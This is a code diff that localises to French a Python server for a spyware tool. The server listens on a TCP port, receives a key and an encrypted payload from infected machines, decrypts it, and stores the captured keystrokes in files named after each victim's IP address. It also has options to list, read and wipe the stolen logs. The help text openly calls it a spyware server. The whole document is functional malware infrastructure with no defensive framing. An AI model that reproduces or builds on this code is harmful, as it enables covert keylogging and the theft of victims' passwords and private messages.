@@ -4,6 +4,7 @@ import datetime
 import os
 import traceback
 import argparse
+
 class Server :
 
     def receive_and_decrypt_file(self,server_port):
@@ -12,17 +13,15 @@ class Server :
             server_socket.bind(("0.0.0.0", server_port))
             server_socket.listen(1)
 
-            print(f"Server listening on port {server_port}")
+            print(f"Écoute du serveur sur le port {server_port}")
 
             client_socket, client_address = server_socket.accept()
-            print(f"Connection from {client_address}")
+            print(f"Connexion depuis {client_address}")
 
-            # Receive the key first
             key = client_socket.recv(1024)
 
             cipher_suite = Fernet(key)
 
-            # Receive encrypted text
             encrypted_text = b""
             while True:
                 chunk = client_socket.recv(4096)
@@ -30,26 +29,21 @@ class Server :
                     break
                 encrypted_text += chunk
 
-            # Decrypt the text
             decrypted_text = cipher_suite.decrypt(encrypted_text)
-
-            # Create a directory named "Fichier" if it doesn't exist
             directory = "Fichier"
             os.makedirs(directory, exist_ok=True)
 
-            # Create a filename based on client IP and current date-time within the "Fichier" directory
             ip_personne = client_address[0]
             filename = os.path.join(directory, f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt")
 
             with open(filename, "wb") as file:
                 file.write(decrypted_text)
 
-            print(f"File received, decrypted, and saved as {filename} successfully.")
+            print(f"Fichier reçu, déchiffré et enregistré sous le nom de {filename} avec succès.")
 
         except Exception as e:
-            print("An error occurred:")
             traceback.print_exc()
-            print(f"Error message: {e}")
+            print(f"{e}")
         finally:
             server_socket.close()
 
@@ -58,13 +52,13 @@ class Server :
         if os.path.exists(directory):
             files = os.listdir(directory)
             if files:
-                print("List of received files:")
+                print("Liste des fichiers reçus :")
                 for file in files:
                     print(file)
             else:
-                print("No files received yet.")
+                print("Aucun fichier n’a encore été reçu.")
         else:
-            print("No files received yet.")
+            print("Aucun fichier n’a encore été reçu.")
 
     def read_file(self,file_name):
         directory = "Fichier"
@@ -72,9 +66,9 @@ class Server :
         if os.path.exists(file_path):
             with open(file_path, "rb") as file:
                 content = file.read()
-                print(f"Content of file {file_name}:\n{content.decode('utf-8')}")
+                print(f"Contenu du fichier {file_name}:\n{content.decode('utf-8')}")
         else:
-            print(f"File {file_name} not found.")
+            print(f"Fichier {file_name} introuvable.")
 
     def kill_server(self):
         directory = "Fichier"
@@ -83,16 +77,16 @@ class Server :
             for file in files:
                 file_path = os.path.join(directory, file)
                 os.remove(file_path)
-            print("All files removed.")
+            print("Tous les fichiers supprimés.")
         else:
-            print("No files to remove.")
+            print("Aucun fichier à supprimer.")
 
     def menu(self):
-        parser = argparse.ArgumentParser(description="Server for receiving and decrypting files from a spyware.")
-        parser.add_argument("-l", "--listen", type=int, help="Listen on the specified TCP port")
-        parser.add_argument("-s", "--show", action="store_true", help="Show the list of received files")
-        parser.add_argument("-r", "--readfile", help="Read the content of the specified file")
-        parser.add_argument("-k", "--kill", action="store_true", help="Kill all running server instances and delete received files")
+        parser = argparse.ArgumentParser(description="Server espion.")
+        parser.add_argument("-l", "--listen", type=int, help="Se met en écoute sur un port TCP")
+        parser.add_argument("-s", "--show", action="store_true", help="Affiche les fichiers réceptionnés par le spyware.")
+        parser.add_argument("-r", "--readfile", help="Lire le contenue du fichier spécifié.")
+        parser.add_argument("-k", "--kill", action="store_true", help="Supprime tous les fichiers récéptionner.")
 
         args = parser.parse_args()
 
